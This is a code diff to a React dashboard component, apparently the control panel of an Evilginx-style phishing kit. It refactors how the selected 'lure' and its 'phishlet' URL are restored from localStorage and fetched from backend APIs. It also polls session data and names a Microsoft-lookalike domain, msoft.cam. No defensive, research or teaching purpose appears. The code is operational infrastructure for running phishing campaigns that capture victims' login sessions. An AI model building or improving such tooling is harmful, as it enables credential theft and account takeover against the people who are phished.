@@ -380,6 +380,117 @@ export default function Dashboard() {
     }
   };
 
+  // Separate useEffect just for initializing lure selection - will run on every mount
+  useEffect(() => {
+    const restoreLureSelection = async () => {
+      try {
+        console.log("Attempting to restore lure selection from localStorage");
+        setLinkLoading(true);
+
+        // First fetch all available lures
+        const luresResponse = await fetch("/api/lures");
+        if (!luresResponse.ok) {
+          throw new Error("Failed to fetch lures");
+        }
+
+        const luresData = await luresResponse.json();
+        const availableLures = luresData.lures || [];
+
+        // Update lures state
+        setLures(availableLures);
+
+        // Get saved lure ID from localStorage
+        const savedLureId = localStorage.getItem("selectedLureId");
+        console.log("Found savedLureId in localStorage:", savedLureId);
+
+        if (availableLures.length > 0 && savedLureId) {
+          // Find the saved lure in the available lures
+          const savedLure = availableLures.find(
+            (lure) => lure.id === savedLureId
+          );
+
+          if (savedLure) {
+            console.log("Found matching lure in available lures:", savedLure);
+            // Set the selected lure immediately
+            setSelectedLure(savedLure);
+
+            // First try to get the URL from lure-url API
+            let gotValidUrl = false;
+            try {
+              const lureIndex = availableLures.findIndex(
+                (lure) => lure.id === savedLureId
+              );
+              if (lureIndex >= 0) {
+                const response = await fetch(
+                  `/api/lure-url?lureIndex=${lureIndex}`
+                );
+                if (response.ok) {
+                  const data = await response.json();
+                  if (data.url && data.url !== "https://msoft.cam/wYyGBBeI") {
+                    console.log("Successfully fetched lure URL:", data.url);
+                    setFullLink(data.url);
+                    gotValidUrl = true;
+                  }
+                }
+              }
+
+              // If first method failed, try the fallback
+              if (!gotValidUrl) {
+                const linkResponse = await fetch(
+                  `/api/full-link?lureId=${savedLureId}`
+                );
+                if (linkResponse.ok) {
+                  const data = await linkResponse.json();
+                  if (
+                    data.fullUrl &&
+                    data.fullUrl !== "https://msoft.cam/wYyGBBeI"
+                  ) {
+                    console.log(
+                      "Successfully fetched fallback URL:",
+                      data.fullUrl
+                    );
+                    setFullLink(data.fullUrl);
+                    gotValidUrl = true;
+                  }
+                }
+              }
+
+              // If both API calls failed, create a fallback URL
+              if (!gotValidUrl) {
+                const fallbackUrl = `${savedLure.phishlet}.${
+                  savedLure.hostname || window.location.hostname
+                }${savedLure.path}`;
+                console.log("Using constructed fallback URL:", fallbackUrl);
+                setFullLink(fallbackUrl);
+              }
+            } catch (error) {
+              console.error("Error restoring lure URL:", error);
+              // Create fallback URL on error
+              const fallbackUrl = `${savedLure.phishlet}.${
+                savedLure.hostname || window.location.hostname
+              }${savedLure.path}`;
+              setFullLink(fallbackUrl);
+            }
+          } else {
+            // If the saved lure ID doesn't match any available lures, clear it
+            console.log("Saved lure ID does not match any available lures");
+            localStorage.removeItem("selectedLureId");
+          }
+        }
+      } catch (error) {
+        console.error("Error in restoreLureSelection:", error);
+      } finally {
+        setLinkLoading(false);
+      }
+    };
+
+    // Always attempt to restore lure selection on mount
+    restoreLureSelection();
+
+    // This useEffect only runs on mount
+  }, []);
+
+  // Modify the original useEffect to not handle lure initialization
   useEffect(() => {
     const fetchData = async () => {
       console.log("Starting data fetch...");
@@ -495,101 +606,6 @@ export default function Dashboard() {
 
     fetchData();
 
-    // Instead of calling fetchFullLink directly, create a wrapper to ensure localStorage is checked first
-    const initializeLureSelection = async () => {
-      try {
-        // First fetch all available lures
-        const luresResponse = await fetch("/api/lures");
-        if (luresResponse.ok) {
-          const luresData = await luresResponse.json();
-          const availableLures = luresData.lures || [];
-
-          // Only update lures if the structure has changed - prevent unnecessary re-renders
-          if (
-            JSON.stringify(availableLures.map((l) => l.id)) !==
-            JSON.stringify(lures.map((l) => l.id))
-          ) {
-            setLures(availableLures);
-          }
-
-          // Get saved lure ID from localStorage if it exists
-          const savedLureId = localStorage.getItem("selectedLureId");
-
-          // If we have lures and a saved ID, and no lure is currently selected
-          if (availableLures.length > 0 && savedLureId && !selectedLure) {
-            // Find the saved lure in the available lures
-            const savedLure = availableLures.find(
-              (lure) => lure.id === savedLureId
-            );
-
-            // If found, select it and fetch its link
-            if (savedLure) {
-              setSelectedLure(savedLure);
-
-              // Only set link loading if we're actually going to fetch a link
-              setLinkLoading(true);
-
-              try {
-                // Fetch the specific lure URL
-                const lureIndex = availableLures.findIndex(
-                  (lure) => lure.id === savedLureId
-                );
-                if (lureIndex >= 0) {
-                  const response = await fetch(
-                    `/api/lure-url?lureIndex=${lureIndex}`
-                  );
-                  if (response.ok) {
-                    const data = await response.json();
-                    if (data.url && data.url !== "https://msoft.cam/wYyGBBeI") {
-                      setFullLink(data.url);
-                      setLinkLoading(false);
-                      return; // Successfully loaded the lure from localStorage
-                    }
-                  }
-                }
-
-                // Fallback to full-link API if needed
-                const linkResponse = await fetch(
-                  `/api/full-link?lureId=${savedLureId}`
-                );
-                if (linkResponse.ok) {
-                  const data = await linkResponse.json();
-                  if (
-                    data.fullUrl &&
-                    data.fullUrl !== "https://msoft.cam/wYyGBBeI"
-                  ) {
-                    setFullLink(data.fullUrl);
-                    setLinkLoading(false);
-                    return; // Successfully loaded the lure
-                  }
-                }
-
-                // If no valid URL, create a fallback
-                const fallbackUrl = `${savedLure.phishlet}.${
-                  savedLure.hostname || window.location.hostname
-                }${savedLure.path}`;
-                setFullLink(fallbackUrl);
-              } catch (error) {
-                console.error("Error fetching saved lure URL:", error);
-              } finally {
-                setLinkLoading(false);
-              }
-            } else {
-              // If the saved lure ID is invalid (lure no longer exists), clear it
-              localStorage.removeItem("selectedLureId");
-            }
-          }
-        }
-      } catch (error) {
-        console.error("Error initializing lure selection:", error);
-      }
-    };
-
-    // Run this only on initial mount
-    if (!selectedLure) {
-      initializeLureSelection();
-    }
-
     // Set up polling interval for data refresh - KEEP THE POLLING SEPARATE FROM LURE SELECTION
     const interval = setInterval(() => {
       // Only fetch session data in the interval, not lure data
@@ -624,14 +640,7 @@ export default function Dashboard() {
       clearInterval(interval);
       window.removeEventListener("linkSettingsUpdated", handleLinkUpdate);
     };
-  }, [
-    calculateStats,
-    geoCache,
-    itemsPerPage,
-    sessions.length,
-    selectedLure,
-    lures,
-  ]);
+  }, [calculateStats, geoCache, itemsPerPage, sessions.length, selectedLure]);
 
   // Effect to fetch the service status on load
   useEffect(() => {
